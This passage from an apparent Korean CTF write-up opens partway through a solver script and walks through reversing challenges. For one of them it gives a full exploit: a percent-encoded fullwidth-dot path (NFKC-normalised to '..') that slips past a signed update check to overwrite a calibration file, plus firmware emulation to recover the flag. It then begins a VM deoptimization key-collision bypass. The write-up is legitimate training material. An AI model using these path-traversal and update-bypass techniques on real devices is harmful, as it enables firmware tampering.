        [Path(configured)]
        if configured
        else [
            Path.cwd(),
            Path(__file__).resolve().parents[1],
            Path(__file__).resolve().parents[1].parent / "for_user",
        ]
    )
    required = (
        "checker",
        "flag.enc",
        "goal.pcode",
        "memory.img",
        "payload.template.bin",
        "target.elf",
        "vectors.bin",
    )
    for candidate in candidates:
        resolved = candidate.resolve()
        if all((resolved / name).is_file() for name in required):
            return resolved
    raise RuntimeError("run from a no-stack-still-turing for_user directory")


def rol32(value: int, count: int) -> int:
    return ((value << count) | (value >> (32 - count))) & 0xFFFFFFFF


def build_payload(template_path: Path, memory_path: Path) -> bytes:
    payload = bytearray(template_path.read_bytes())
    memory = memory_path.read_bytes()
    if len(payload) != 0xB8 or payload[:4] != b"NSST":
        raise ValueError("unexpected payload template")

    struct.pack_into("<I", payload, 0x18, START_PC)
    struct.pack_into("<I", payload, 0x24, KEY_DISPLACEMENT)

    for replacement_no, (node_offset, new_function_id) in enumerate(REPLACEMENTS):
        _old_id, argument_offset, next_offset, _old_guard = struct.unpack_from(
            "<4I", memory, node_offset
        )
        new_guard = rol32(new_function_id ^ argument_offset ^ next_offset ^ COOKIE, 7)
        for write_no, (offset, value) in enumerate(
            ((node_offset, new_function_id), (node_offset + 12, new_guard))
        ):
            record = 2 + replacement_no * 2 + write_no
            struct.pack_into(
                "<BBHII",
                payload,
                0x10 + record * 12,
                2,
                0,
                offset,
                0,
                value,
            )
    return bytes(payload)


def solve() -> str:
    handout = locate_handout()
    payload = build_payload(handout / "payload.template.bin", handout / "memory.img")
    with tempfile.TemporaryDirectory(prefix="nsst-reference-") as directory:
        work = Path(directory) / "handout"
        work.mkdir()
        for name in (
            "checker",
            "flag.enc",
            "goal.pcode",
            "memory.img",
            "payload.template.bin",
            "target.elf",
            "vectors.bin",
        ):
            shutil.copy2(handout / name, work / name)
        (work / "payload.bin").write_bytes(payload)
        completed = subprocess.run(
            [str(work / "checker")],
            cwd=work,
            text=True,
            capture_output=True,
            env=os.environ.copy(),
        )
    output = completed.stdout.strip()
    if completed.returncode or not (output.startswith("SHA{") and output.endswith("}")):
        raise RuntimeError(completed.stderr.strip() or output or "native checker rejected payload")
    return output


def main() -> None:
    print(solve())


if __name__ == "__main__":
    main()
```
### 2.5 응답 없는 센서 세 대를 다시 연결해 주세요

| 항목 | 내용 |
|---|---|
| 의뢰인 | `S0LDER.GUN_9` |
| 분야 | Reversing |
| 난이도 | 하 |
| 제공 파일 | `Ghost-Callback-player.zip` |
| 핵심 원리 | 서명 검증 전후의 퍼센트 디코딩·NFKC 경로 해석 차이 |
| 목표 | 업데이트 경계를 우회하고 세 장치의 콜백 체인 복구 |
| 플래그 | `SHA{one_semantic_policy_wakes_the_entire_ghost_fleet}` |

![대회 플랫폼의 센서 콜백 복구 의뢰 화면](/assets/img/room-escape-ctf/extra-requests/ctfd-ghost-callback-challenge.png)

*그림 8. 응답 없는 센서의 콜백 복구 의뢰 화면.*
{: .text-center }

이 의뢰는 서명된 업데이트 패키지로 세 ARM Thumb 센서의 calibration 파일을 바꾸고, 펌웨어에 숨겨진 콜백 체인을 복구하는 문제입니다.

업데이트 검증기는 원본 경로에서 일반적인 `..` 패턴을 차단하지만, extractor는 퍼센트 디코딩과 NFKC 정규화를 거친 경로를 사용합니다. 퍼센트 인코딩된 전각 마침표는 검증 단계에서는 안전한 하위 경로로 보이지만, 정규화 이후 부모 경로가 되어 calibration 파일을 덮어쓸 수 있습니다.

#### 1. 업데이트 경계 우회

서명된 manifest는 세 펌웨어와 원래 calibration의 TAR 경로와 해시를 검증합니다. 그러나 이후 단계는 URL 퍼센트 디코딩과 NFKC를 적용하고, C extractor는 변환된 경로에서 부모 경로를 다시 해석합니다.

직접적인 `%2e%2e`는 중간 검사에서 거부됩니다. 대신 `extras/` 아래에 퍼센트 인코딩된 전각 마침표 두 개를 넣으면 원본 경로 검사와 서명 검증을 통과한 뒤 NFKC에서 `..`로 변환됩니다. 이 항목으로 generation 18 calibration을 덮어씁니다.

#### 2. 실제 콜백 테이블 식별

각 64 KiB 펌웨어에는 96개의 유효 Thumb 주소로 이루어진 포인터 테이블이 세 개 있습니다. 세 테이블 모두 주소 범위와 함수 prologue 검사를 통과하지만 두 개는 decoy입니다. vector table에서 ISR을 찾고 ISR의 dataflow가 실제로 참조하는 테이블을 선택해야 합니다.

콜백은 고정 간격으로 배치되지 않으며 XOR, ADD, SUB, rotate, NOT을 조합한 여섯 코드 생성 방식으로 만들어집니다. 특정 바이트 패턴을 찾는 대신 Unicorn에서 함수를 실행하고 첫 guard 비교 시점의 register와 여러 경로 입력의 출력을 관찰해 다음 값을 복구합니다.

- 입력 guard와 다음 guard
- 두 개의 32비트 route term
- 두 rotate 값
- register 변환 상수

#### 3. 콜백 체인 분석

세 펌웨어에서 vector table과 ISR의 dataflow를 추적해 실제 콜백 포인터 테이블을 찾습니다. 이후 각 콜백을 Unicorn에서 격리 실행해 guard와 두 경로 상태의 전이를 기록합니다.

각 장치에는 20단계의 경로가 있으며 단계마다 네 가지 선택지가 존재합니다. 전체를 전수 조사하지 않고 앞뒤 10단계로 나눈 meet-in-the-middle을 사용하면 유일한 콜백 체인을 복구할 수 있습니다.

```text
a' = ROR32(a xor term0, rot0) + b
b' = ROR32(b xor term1, rot1) + a'
```

이 전이는 역산할 수 있으므로 앞쪽 `4^10` 상태를 저장한 뒤 최종 상태에서 뒤쪽 10단계를 거꾸로 탐색합니다. 세 장치는 서로 다른 선택 벡터를 사용하므로 한 장치에서 찾은 분기 번호를 다른 장치에 그대로 적용할 수 없습니다.

#### 4. 이벤트 생성과 플래그 복호화

세 장치에서 얻은 route proof로 calibration seed와 channel permutation을 계산하고 `events_a.json`부터 `events_c.json`을 작성합니다. 장치 실행기가 생성한 transcript, 실제 설치 의미를 기록한 receipt와 firmware digest를 조합하면 `flag.enc`의 ChaCha20-Poly1305 키가 완성됩니다.

```text
SHA{one_semantic_policy_wakes_the_entire_ghost_fleet}
```

#### 5. 익스플로잇

```python
#!/usr/bin/env python3
from __future__ import annotations

from collections import defaultdict
from importlib.machinery import SourcelessFileLoader
from pathlib import Path
import hashlib
import io
import json
import os
import re
import shutil
import struct
import subprocess
import sys
import tarfile
import tempfile
import zlib


def locate_public_handout():
    candidates = [
        Path.cwd(),
        Path(__file__).resolve().parents[2],
        Path(__file__).resolve().parents[2].parent / "for_user",
    ]
    for candidate in candidates:
        resolved = candidate.resolve()
        if (resolved / "device.json").is_file() and (resolved / "crypto_core.py").is_file():
            return resolved
    raise RuntimeError("run from a ghost-callback handout containing device.json")


_CONFIGURED_HANDOUT = os.environ.get("GHOST_HANDOUT_DIR")
HANDOUT = Path(_CONFIGURED_HANDOUT).resolve() if _CONFIGURED_HANDOUT else locate_public_handout()
PUBLIC_HANDOUT = None if _CONFIGURED_HANDOUT else HANDOUT
sys.path[:0] = [str(HANDOUT / "vendor"), str(HANDOUT)]
from capstone import Cs, CS_ARCH_ARM, CS_MODE_THUMB
from crypto_core import INSTALL_RECEIPT_MAGIC, aead_decrypt
from unicorn import Uc, UC_ARCH_ARM, UC_HOOK_CODE, UC_MODE_THUMB
from unicorn.arm_const import (
    UC_ARM_REG_LR,
    UC_ARM_REG_R6,
    UC_ARM_REG_SP,
)

AAD = b"ghost-callback-fleet-v6"
FLASH = 0x08000000
SRAM = 0x20000000
CONTEXT = SRAM + 0x2000
OUTPUT_OFFSET = 24
CALLBACK_COUNT = 96
CHAIN_LENGTH = 20
ROUTE_TARGET_OFFSETS = (0x1380, 0x1390, 0x13A0)
DEVICE_NAMES = ("a", "b", "c")
CALIBRATION_KDF_DOMAIN = b"ghost-callback-calibration-proof-v5\x00"
INTENDED_OVERWRITE_PATH = "extras/%EF%BC%8E%EF%BC%8E/profiles/calibration.bin"
EXPECTED_TRANSCRIPT = CHAIN_LENGTH * 8
ROUTE_STATE0_OFFSET = OUTPUT_OFFSET + EXPECTED_TRANSCRIPT
ROUTE_STATE1_OFFSET = ROUTE_STATE0_OFFSET + 4
PROBE_RETURN = FLASH + 0x700


def calibration(generation, mmio_seed, permutation_seed, nonce_material):
    body = b"CAL1" + struct.pack("<I", generation) + mmio_seed + permutation_seed + nonce_material
    return body + struct.pack("<II", zlib.crc32(body) & 0xFFFFFFFF, 0)


def calibration_seeds(recovered):
    material = bytearray(CALIBRATION_KDF_DOMAIN)
    for name in DEVICE_NAMES:
        proof = recovered[name]
        by_id = {edge[0]: edge for edge in proof["edges"]}
        material += name.encode("ascii")
        material += struct.pack("<II", *proof["route_target"])
        for callback_id in proof["chain"]:
            (
                _callback_id,
                expected,
                following,
                term0,
                term1,
                rotate0,
                rotate1,
                _address,
            ) = by_id[callback_id]
            material += struct.pack(
                "<BIIIIBB",
                callback_id,
                expected,
                following,
                term0,
                term1,
                rotate0,
                rotate1,
            )
    digest = hashlib.blake2s(material).digest()
    return digest[:16], digest[16:]


def immediate(op_str):
    match = re.search(r"#(0x[0-9a-f]+|[0-9]+)", op_str)
    if not match:
        raise ValueError("immediate recovery failed")
    return int(match.group(1), 0)


def immediate_pairs(instructions, register):
    values = []
    for first, second in zip(instructions, instructions[1:]):
        if (
            first.mnemonic == "movw"
            and second.mnemonic == "movt"
            and first.op_str.startswith(register + ",")
            and second.op_str.startswith(register + ",")
        ):
            values.append(immediate(first.op_str) | (immediate(second.op_str) << 16))
    return values


def masked_constants(instructions):
    """Recover constants materialized as (value^mask), mask, EOR."""
    values = []
    for index in range(len(instructions) - 4):
        first, second, third, fourth, fifth = instructions[index : index + 5]
        if not (
            first.mnemonic == "movw"
            and second.mnemonic == "movt"
            and third.mnemonic == "movw"
            and fourth.mnemonic == "movt"
            and fifth.mnemonic.startswith("eor")
        ):
            continue
        destination = first.op_str.split(",", 1)[0].strip()
        scratch = third.op_str.split(",", 1)[0].strip()
        if not second.op_str.startswith(destination + ",") or not fourth.op_str.startswith(
            scratch + ","
        ):
            continue
        operands = [part.strip() for part in fifth.op_str.split(",")]
        if operands != [destination, destination, scratch]:
            continue
        encoded = immediate(first.op_str) | (immediate(second.op_str) << 16)
        mask = immediate(third.op_str) | (immediate(fourth.op_str) << 16)
        values.append((index, destination, encoded ^ mask))
    return values


def pointer_table_candidates(firmware):
    candidates = []
    for offset in range(0x600, 0x1800, 4):
        addresses = struct.unpack_from(f"<{CALLBACK_COUNT}I", firmware, offset)
        if len(set(addresses)) != CALLBACK_COUNT:
            continue
        if all(
            FLASH + 0x1800 <= address < FLASH + len(firmware) - 2
            and firmware[address - FLASH : address - FLASH + 2] == b"\xf0\xb5"
            for address in addresses
        ):
            candidates.append((FLASH + offset, list(addresses)))
    return candidates


def recover_pointer_table(firmware):
    isr = struct.unpack_from("<I", firmware, 16 * 4)[0] & ~1
    disassembler = Cs(CS_ARCH_ARM, CS_MODE_THUMB)
    instructions = list(disassembler.disasm(firmware[isr - FLASH : isr - FLASH + 160], isr))
    referenced = {
        value
        for register in ("r0", "r1", "r2", "r3", "r4", "r5", "r6", "r7", "ip")
        for value in immediate_pairs(instructions, register)
    }
    matches = [
        addresses
        for address, addresses in pointer_table_candidates(firmware)
        if address in referenced
    ]
    if len(matches) != 1:
        raise ValueError(f"ISR-selected callback pointer table is ambiguous: {len(matches)}")
    return matches[0]


def callback_instructions(firmware, address):
    disassembler = Cs(CS_ARCH_ARM, CS_MODE_THUMB)
    result = []
    for instruction in disassembler.disasm(
        firmware[address - FLASH : address - FLASH + 512], address
    ):
        result.append(instruction)
        if instruction.mnemonic == "pop" and "pc" in instruction.op_str:
            break
    if not result or result[-1].mnemonic != "pop":
        raise ValueError(f"callback at {address:#x} has no return")
    return result


def callback_vm(firmware):
    emulator = Uc(UC_ARCH_ARM, UC_MODE_THUMB)
    emulator.mem_map(FLASH, 0x10000)
    emulator.mem_map(SRAM, 0x10000)
    emulator.mem_write(FLASH, firmware)
    emulator.reg_write(UC_ARM_REG_SP, SRAM + 0xF000)
    emulator.reg_write(UC_ARM_REG_LR, PROBE_RETURN | 1)
    return emulator


def recover_expected_guard(firmware, address):
    instructions = callback_instructions(firmware, address)
    comparisons = [
        instruction.address
        for instruction in instructions
        if instruction.mnemonic.startswith("cmp")
    ]
    if not comparisons:
        raise ValueError("callback guard comparison not found")
    emulator = callback_vm(firmware)
    emulator.mem_write(CONTEXT, bytes(ROUTE_STATE1_OFFSET + 4))
    result = []

    def hook(uc, current, _size, _user):
        if current == comparisons[0]:
            result.append(uc.reg_read(UC_ARM_REG_R6) & 0xFFFFFFFF)
            uc.emu_stop()

    emulator.hook_add(UC_HOOK_CODE, hook)
    emulator.emu_start(address | 1, FLASH + len(firmware), count=1000)
    if len(result) != 1:
        raise ValueError("callback guard probe did not reach comparison")
    return result[0]


def execute_callback_probe(firmware, address, expected, route_state):
    emulator = callback_vm(firmware)
    context = bytearray(ROUTE_STATE1_OFFSET + 4)
    struct.pack_into("<I", context, 0, expected)
    struct.pack_into("<4I", context, 8, 0x13579BDF, 0x2468ACE0, 0x10203040, 0x55667788)
    struct.pack_into("<II", context, ROUTE_STATE0_OFFSET, *route_state)
    emulator.mem_write(CONTEXT, bytes(context))
    returned = []

    def hook(uc, current, _size, _user):
        if current == PROBE_RETURN:
            returned.append(True)
            uc.emu_stop()

    emulator.hook_add(UC_HOOK_CODE, hook)
    emulator.emu_start(address | 1, FLASH + len(firmware), count=3000)
    if not returned:
        raise ValueError(f"callback at {address:#x} did not return")
    raw = bytes(emulator.mem_read(CONTEXT, ROUTE_STATE1_OFFSET + 4))
    following = struct.unpack_from("<I", raw, 0)[0]
    state = struct.unpack_from("<II", raw, ROUTE_STATE0_OFFSET)
    return following, state


def recover_callback_semantics(firmware, address):
    expected = recover_expected_guard(firmware, address)
    inputs = ((0, 0), (0x01234567, 0x89ABCDEF), (0xF0E1D2C3, 0x10293847))
    probes = [execute_callback_probe(firmware, address, expected, state) for state in inputs]
    followings = {following for following, _state in probes}
    if len(followings) != 1:
        raise ValueError("callback next guard is input-dependent")

    first_candidates = []
    second_candidates = []
    for rotation in range(1, 32):
        terms = {
            old[0] ^ rotate_left((new[0] - old[1]) & 0xFFFFFFFF, rotation)
            for old, (_following, new) in zip(inputs, probes)
        }
        if len(terms) == 1:
            first_candidates.append((rotation, terms.pop()))
        terms = {
            old[1] ^ rotate_left((new[1] - new[0]) & 0xFFFFFFFF, rotation)
            for old, (_following, new) in zip(inputs, probes)
        }
        if len(terms) == 1:
            second_candidates.append((rotation, terms.pop()))
    if len(first_candidates) != 1 or len(second_candidates) != 1:
        raise ValueError("callback route transition is ambiguous")
    rotate0, term0 = first_candidates[0]
    rotate1, term1 = second_candidates[0]
    return expected, followings.pop(), term0, term1, rotate0, rotate1


def recover_callback_graph(firmware):
    addresses = recover_pointer_table(firmware)
    edges = []
    for callback_id, address in enumerate(addresses):
        expected, following, term0, term1, rotate0, rotate1 = recover_callback_semantics(
            firmware, address
        )
        edges.append(
            (
                callback_id,
                expected,
                following,
                term0,
                term1,
                rotate0,
                rotate1,
                address,
            )
        )
    return edges


def recover_route_target(firmware, layers):
    matches = []
    for offset in ROUTE_TARGET_OFFSETS:
        target = struct.unpack_from("<II", firmware, offset)
        try:
            chain = solve_route(layers, target)
        except ValueError:
            continue
        matches.append((target, chain))
    if len(matches) != 1:
        raise ValueError(f"expected one reachable route target, found {len(matches)}")
    return matches[0]


def recover_layers(edges):
    outgoing = defaultdict(list)
    incoming = set()
    for callback_id, expected, following, term0, term1, rotate0, rotate1, _address in edges:
        outgoing[expected].append((callback_id, following, term0, term1, rotate0, rotate1))
        incoming.add(following)
    roots = [
        guard for guard, choices in outgoing.items() if len(choices) == 4 and guard not in incoming
    ]
    valid = []
    for root in roots:
        guard = root
        layers = []
        for _ in range(CHAIN_LENGTH):
            choices = outgoing.get(guard, [])
            if len(choices) != 4 or len({choice[1] for choice in choices}) != 1:
                break
            layers.append(sorted(choices))
            guard = choices[0][1]
        if len(layers) == CHAIN_LENGTH:
            valid.append(layers)
    if len(valid) != 1:
        raise ValueError(f"expected one {CHAIN_LENGTH}-layer callback graph, found {len(valid)}")
    return valid[0]


def rotate_right(value, count):
    return ((value >> count) | (value << (32 - count))) & 0xFFFFFFFF


def rotate_left(value, count):
    return ((value << count) | (value >> (32 - count))) & 0xFFFFFFFF


def route_forward(state, choice):
    first, second = state
    first = (rotate_right(first ^ choice[2], choice[4]) + second) & 0xFFFFFFFF
    second = (rotate_right(second ^ choice[3], choice[5]) + first) & 0xFFFFFFFF
    return first, second


def route_inverse(state, choice):
    first, second = state
    old_second = rotate_left((second - first) & 0xFFFFFFFF, choice[5]) ^ choice[3]
    old_first = rotate_left((first - old_second) & 0xFFFFFFFF, choice[4]) ^ choice[2]
    return old_first, old_second


def pack_state(state):
    return (state[0] << 32) | state[1]


def solve_route(layers, target):
    """Bidirectional search over 4^20 coupled transitions (2 * 4^10 leaves)."""
    split = len(layers) // 2
    left = {}

    def build_left(depth, state, code):
        if depth == split:
            key = pack_state(state)
            left[key] = code if key not in left else -1
            return
        for choice_index, choice in enumerate(layers[depth]):
            build_left(depth + 1, route_forward(state, choice), (code << 2) | choice_index)

    build_left(0, (0, 0), 0)
    solutions = []
    reverse_path = []

    def search_right(depth, state):
        if len(solutions) > 1:
            return
        if depth < split:
            code = left.get(pack_state(state))
            if code is None:
                return
            if code < 0:
                solutions.extend((None, None))
                return
            prefix = [0] * split
            for index in range(split - 1, -1, -1):
                prefix[index] = code & 3
                code >>= 2
            solutions.append(prefix + list(reversed(reverse_path)))
            return
        for choice_index, choice in enumerate(layers[depth]):
            reverse_path.append(choice_index)
            search_right(depth - 1, route_inverse(state, choice))
            reverse_path.pop()

    search_right(len(layers) - 1, tuple(target))
    if len(solutions) != 1 or solutions[0] is None:
        raise ValueError(f"coupled route state has {len(solutions)} solutions")
    return [layers[index][choice_index][0] for index, choice_index in enumerate(solutions[0])]


def recover_nonce_and_targets(firmware):
    reset = struct.unpack_from("<I", firmware, 4)[0] & ~1
    disassembler = Cs(CS_ARCH_ARM, CS_MODE_THUMB)
    instructions = list(disassembler.disasm(firmware[reset - FLASH : reset - FLASH + 112], reset))
    r2_pairs = immediate_pairs(instructions, "r2")
    nonce_addresses = [value for value in r2_pairs if FLASH <= value <= FLASH + len(firmware) - 16]
    if not nonce_addresses:
        raise ValueError("nonce verification address not recovered")
    nonce_offset = nonce_addresses[0] - FLASH
    nonce = firmware[nonce_offset : nonce_offset + 16]
    referenced = {
        value
        for register in ("r0", "r1", "r2", "r3", "r4", "r5", "r6", "r7", "ip")
        for value in immediate_pairs(
            list(disassembler.disasm(firmware[reset - FLASH : reset - FLASH + 0x300], reset)),
            register,
        )
    }
    target_tables = []
    for address in referenced:
        offset = address - FLASH
        if offset < 0 or offset + CALLBACK_COUNT * 2 > len(firmware):
            continue
        values = list(struct.unpack_from(f"<{CALLBACK_COUNT}H", firmware, offset))
        if all(value <= 256 for value in values):
            target_tables.append(values)
    if len(target_tables) != 1:
        raise ValueError(f"runtime-selected target table is ambiguous: {len(target_tables)}")
    targets = target_tables[0]
    if len(nonce) != 16 or any(value > 256 for value in targets):
        raise ValueError("firmware calibration constants invalid")
    return nonce, targets


def permutation(seed):
    state = int.from_bytes(seed[:4], "little") or 1
    order = list(range(CALLBACK_COUNT))
    for index in range(CALLBACK_COUNT - 1, 0, -1):
        state ^= (state << 13) & 0xFFFFFFFF
        state ^= state >> 17
        state ^= (state << 5) & 0xFFFFFFFF
        state &= 0xFFFFFFFF
        other = (state & 255) % (index + 1)
        order[index], order[other] = order[other], order[index]
    return order


def condition(sample, channel, window, mmio_seed, targets):
    return ((sample ^ mmio_seed[channel & 15]) + window) % 257 == targets[channel]


def build_events(chain, mmio_seed, permutation_seed, targets):
    order = permutation(permutation_seed)
    # Leave the full Fisher-Yates boot shuffle behind before scheduling
    # input. Otherwise several already-due events can overwrite one MMIO slot.
    events, window, cycle = [], 0, 100_000
    for callback_id in chain:
        channel = order.index(callback_id)
        sequence = None
        for sample in range(256):
            next_window = (window + sample) & 255
            if condition(sample, channel, next_window, mmio_seed, targets):
                sequence = [(channel, sample)]
                break
        if sequence is None:
            for adjustment_channel in range(CALLBACK_COUNT):
                for adjustment in range(256):
                    adjusted_window = (window + adjustment) & 255
                    if condition(
                        adjustment, adjustment_channel, adjusted_window, mmio_seed, targets
                    ):
                        continue
                    for sample in range(256):
                        next_window = (adjusted_window + sample) & 255
                        if condition(sample, channel, next_window, mmio_seed, targets):
                            sequence = [(adjustment_channel, adjustment), (channel, sample)]
                            break
                    if sequence:
                        break
                if sequence:
                    break
        if sequence is None:
            raise ValueError("MMIO event inversion failed")
        for event_channel, sample in sequence:
            cycle += 3000
            events.append({"cycle": cycle, "channel": event_channel, "sample": sample, "status": 1})
            window = (window + sample) & 255
    return events


def tar_header(name, size):
    """Create the optional TAR entry using the format visible in the handout."""
    raw_name = name.encode("ascii")
    if len(raw_name) > 100:
        raise ValueError("candidate TAR path is too long")
    header = bytearray(512)
    header[: len(raw_name)] = raw_name
    for position, width, value in (
        (100, 8, 0o600),
        (108, 8, 0),
        (116, 8, 0),
        (124, 12, size),
        (136, 12, 0),
    ):
        header[position : position + width] = f"{value:0{width - 1}o}\0".encode("ascii")
    header[148:156] = b"        "
    header[156] = ord("0")
    header[257:263] = b"ustar\0"
    header[263:265] = b"00"
    header[148:156] = f"{sum(header):06o}\0 ".encode("ascii")
    return bytes(header)


def original_entries(payload):
    """Parse the signed public TAR for regression checks and explanation."""
    result = []
    with tarfile.open(fileobj=io.BytesIO(payload), mode="r:") as archive:
        for member in archive.getmembers():
            if member.isfile():
                result.append((member.name, archive.extractfile(member).read()))
    return result


def write_candidate(calibration_data):
    package = bytearray((HANDOUT / "normal_update.pkg").read_bytes())
    header_size = struct.calcsize("<8sIIII")
    if len(package) < header_size:
        raise ValueError("public update package is truncated")
    magic, _version, manifest_size, signature_size, payload_size = struct.unpack_from(
        "<8sIIII", package
    )
    if magic != b"GHOSTPKG":
        raise ValueError("public update package magic mismatch")
    payload_offset = header_size + manifest_size + signature_size
    payload = bytearray(package[payload_offset : payload_offset + payload_size])
    if len(payload) != payload_size or len(payload) % 512:
        raise ValueError("public update TAR is malformed")
    empty = bytes(512)
    insertion = next(
        (
            offset
            for offset in range(0, len(payload), 512)
            if payload[offset : offset + 512] == empty
        ),
        None,
    )
    padded_size = (len(calibration_data) + 511) & ~511
    if insertion is None or insertion + 512 + padded_size + 512 > len(payload):
        raise ValueError("public update TAR has no optional-entry capacity")
    payload[insertion : insertion + 512] = tar_header(
        INTENDED_OVERWRITE_PATH, len(calibration_data)
    )
    payload[insertion + 512 : insertion + 512 + len(calibration_data)] = calibration_data
    package[payload_offset : payload_offset + payload_size] = payload
    (HANDOUT / "candidate.pkg").write_bytes(package)
    return bytes(package)


def load_runner():
    tag = f"{sys.version_info.major}{sys.version_info.minor}"
    bytecode = HANDOUT / f"device_runner.cpython-{tag}.pyc"
    if not bytecode.is_file():
        raise RuntimeError(
            f"device runner is not built for CPython {sys.version_info.major}.{sys.version_info.minor}"
        )
    return SourcelessFileLoader("ghost_device_runner", str(bytecode)).load_module()


def parse_outputs(raw):
    if raw[:4] != b"GCO5":
        raise ValueError("fleet output magic mismatch")
    cursor, result = 4, {}
    for name in DEVICE_NAMES:
        if cursor + 2 > len(raw):
            raise ValueError("fleet output truncated")
        length = struct.unpack_from("<H", raw, cursor)[0]
        cursor += 2
        if cursor + length > len(raw):
            raise ValueError("fleet output truncated")
        result[name] = raw[cursor : cursor + length]
        cursor += length
    if cursor != len(raw) or any(len(value) != EXPECTED_TRANSCRIPT for value in result.values()):
        raise ValueError("fleet output length mismatch")
    return result


def derive_key(calibration_data, firmwares, outputs, install_receipt=None):
    if install_receipt is None:
        install_receipt = (HANDOUT / ".stage/.install_receipt").read_bytes()
    if len(install_receipt) != 36 or not install_receipt.startswith(INSTALL_RECEIPT_MAGIC):
        raise ValueError("semantic install receipt mismatch")
    material = bytearray(b"ghost-callback-fleet-receipt-v6\x00")
    material += hashlib.sha256(calibration_data).digest()
    material += install_receipt[4:]
    for name in DEVICE_NAMES:
        material += name.encode() + hashlib.sha256(firmwares[name]).digest() + outputs[name]
    return hashlib.blake2s(material).digest()


def solve_workspace(progress=True):
    if PUBLIC_HANDOUT is not None and HANDOUT == PUBLIC_HANDOUT:
        raise RuntimeError("refusing to run the writable pipeline in the public handout")

    def report(number, text):
        if progress:
            print(f"[{number}/7] {text}", flush=True)

    report(1, "signed package boundary and Unicode normalization mismatch")
    firmwares = {name: (HANDOUT / f"firmware_{name}.bin").read_bytes() for name in DEVICE_NAMES}
    recovered = {}
    common_nonce = None
    for index, name in enumerate(DEVICE_NAMES, 2):
        report(index, f"device_{name}: masked constants, 4^20 graph, coupled route state")
        edges = recover_callback_graph(firmwares[name])
        layers = recover_layers(edges)
        route_target, chain = recover_route_target(firmwares[name], layers)
        nonce, targets = recover_nonce_and_targets(firmwares[name])
        if common_nonce is None:
            common_nonce = nonce
        elif common_nonce != nonce:
            raise ValueError("fleet nonce mismatch")
        recovered[name] = {
            "chain": chain,
            "targets": targets,
            "edges": edges,
            "route_target": route_target,
        }

    report(5, "universal candidate package with compatibility-character rebinding")
    mmio_seed, permutation_seed = calibration_seeds(recovered)
    cal = calibration(18, mmio_seed, permutation_seed, common_nonce)
    write_candidate(cal)
    update = subprocess.run([str(HANDOUT / "updater")], cwd=HANDOUT, capture_output=True, text=True)
    if update.returncode:
        raise ValueError(update.stderr.strip())

    report(6, "invert three MMIO schedules and collect 20-callback transcripts")
    runner = load_runner()
    chains, events_by_device = {}, {}
    for name in DEVICE_NAMES:
        chain = recovered[name]["chain"]
        targets = recovered[name]["targets"]
        events = build_events(chain, mmio_seed, permutation_seed, targets)
        output = runner.run_firmware(firmwares[name], cal, events)
        if len(output) != EXPECTED_TRANSCRIPT:
            raise ValueError(f"device_{name}: semantic route did not execute")
        chains[name] = chain
        events_by_device[name] = events
        (HANDOUT / f"events_{name}.json").write_text(
            json.dumps({"events": events}, indent=2) + "\n"
        )
    actual = subprocess.run(
        [str(HANDOUT / "device_runner")], cwd=HANDOUT, capture_output=True, text=True
    )
    if actual.returncode:
        raise ValueError(actual.stderr.strip())
    outputs = parse_outputs((HANDOUT / "callback_outputs.bin").read_bytes())

    report(7, "combine all device transcripts and authenticate the flag")
    blob = (HANDOUT / "flag.enc").read_bytes()
    if blob[:4] != b"GCF6":
        raise ValueError("flag container mismatch")
    key = derive_key(cal, firmwares, outputs)
    plaintext = aead_decrypt(key, blob[4:16], blob[16:], AAD).decode()
    if not plaintext.startswith("SHA{"):
        raise ValueError("decrypted value is not a flag")
    if progress:
        print(plaintext)
    return plaintext, chains, events_by_device


def solve(progress=True):
    """Run the destructive pipeline in a disposable handout copy."""
    global HANDOUT
    original = HANDOUT
    with tempfile.TemporaryDirectory() as directory:
        work = Path(directory) / "handout"
        shutil.copytree(
            original,
            work,
            ignore=shutil.ignore_patterns(
                "_solve",
                "solution",
                "__pycache__",
                ".stage",
                "candidate.pkg",
                "callback_outputs.bin",
            ),
        )
        HANDOUT = work
        try:
            return solve_workspace(progress)
        finally:
            HANDOUT = original


if __name__ == "__main__":
    solve()
```
### 2.6 금고가 열린 순간의 영상을 찾아 주세요

| 항목 | 내용 |
|---|---|
| 의뢰인 | `FRAME_GHOST` |
| 분야 | Reversing |
| 난이도 | 중 |
| 제공 파일 | `Phantom-Frame-player.zip` |
| 핵심 원리 | `namespace`와 `frame` 상위 비트를 누락한 deoptimization frame state 키 충돌 |
| 목표 | `reference`에서는 실패하고 세 최적화 프로필에서 성공하는 `candidate.pbc` 제작 |
| 플래그 | `SHA{phantom_frames_survive_optimization}` |

![대회 플랫폼의 금고 영상 의뢰 화면](/assets/img/room-escape-ctf/extra-requests/ctfd-phantom-frame-challenge.png)

*그림 9. 금고 영상 복구 의뢰 화면.*
{: .text-center }

이 의뢰는 하나의 `candidate.pbc`가 `reference` 실행에서는 실패하고 alpha·beta·gamma 최적화 프로필에서는 모두 성공하도록 만드는 VM 리버싱 문제입니다.

#### 1. PPBC 형식과 opcode 복구

세 sample과 `phantom_vm` loader를 비교하면 32바이트 header, constant table, 16바이트 function descriptor, 2·4·8바이트 명령과 마지막 SHA-256으로 구성된 PPBC 형식을 복구할 수 있습니다. stripped runner의 descriptor table을 분석해 빌드마다 달라지는 opcode 순열도 되찾습니다.

`reference`와 `baseline`은 사용자 local과 내부 보안 local을 분리합니다. 최적화 계층은 main loop의 OSR 지점에서 프로필이 선택한 함수를 인라인하고, 예외 처리 경로에서 사용할 deoptimization frame state를 생성합니다.

취약점은 deoptimization frame state를 저장하는 빠른 경로가 local의 전체 식별자 대신 축약된 키를 사용하는 데 있습니다.

```text
full  = namespace:2 || inline_frame:10 || slot:12
short = inline_frame_low4 || slot_low12
```

#### 2. 세 프로필에 공통인 충돌 구성

공격자가 제어하는 local을 `(User, frame=1, slot=13)`에 배치하고, alpha·beta·gamma의 내부 root local을 각각 frame 17·33·49의 slot 13에 배치합니다. 전체 ID는 다르지만 축약 키는 모두 `0x100d`로 충돌합니다.

프로필마다 최적화를 중단시키는 조건은 서로 다릅니다.

- alpha: signed overflow
- beta: shape mismatch
- gamma: bounds speculation failure

| 프로필 | 내부 guard frame | padding call | trap |
|---|---:|---:|---|
| alpha | 17 | 14 | signed overflow |
| beta | 33 | 30 | shape mismatch |
| gamma | 49 | 46 | bounds speculation failure |

padding call 수와 bytecode 배치를 조정해 세 trap을 하나의 candidate에 구성합니다. uncommon trap 이후 복원기가 충돌한 frame state를 사용하면 공격자 local이 내부 shadow capability로 복원됩니다.

#### 3. `reference` 실패와 의미 증명 검증

